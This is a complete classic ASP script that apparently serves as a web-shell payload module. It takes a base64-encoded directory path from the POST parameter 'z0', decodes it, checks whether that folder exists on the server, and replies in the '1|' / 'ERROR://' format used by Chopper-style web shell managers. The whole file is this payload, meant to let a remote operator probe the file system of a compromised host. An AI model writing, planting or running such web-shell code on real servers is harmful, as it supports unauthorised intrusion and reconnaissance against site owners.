<%

Dim szDirPath
szDirPath = Base64Decode(Request.Form("z0"))

Dim fso
Set fso = Server.CreateObject("Scripting.FileSystemObject")

If fso.FolderExists(szDirPath) Then
    Response.Write "1|" & szDirPath
Else
    Response.Write "ERROR://Cannot open directory."
End If

Set fso = Nothing

Function Base64Decode(strBase64)
    Dim xmlDoc, xmlNode

    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set xmlNode = xmlDoc.createElement("base64")

    xmlNode.DataType = "bin.base64"
    xmlNode.Text = strBase64

    Base64Decode = BinaryToText(xmlNode.nodeTypedValue)

    Set xmlNode = Nothing
    Set xmlDoc = Nothing
End Function

Function BinaryToText(BinaryData)
    Dim Stream

    Set Stream = CreateObject("ADODB.Stream")
    Stream.Type = 1
    Stream.Open
    Stream.Write BinaryData
    Stream.Position = 0
    Stream.Type = 2
    Stream.Charset = "utf-8"

    BinaryToText = Stream.ReadText

    Stream.Close
    Set Stream = Nothing
End Function

%>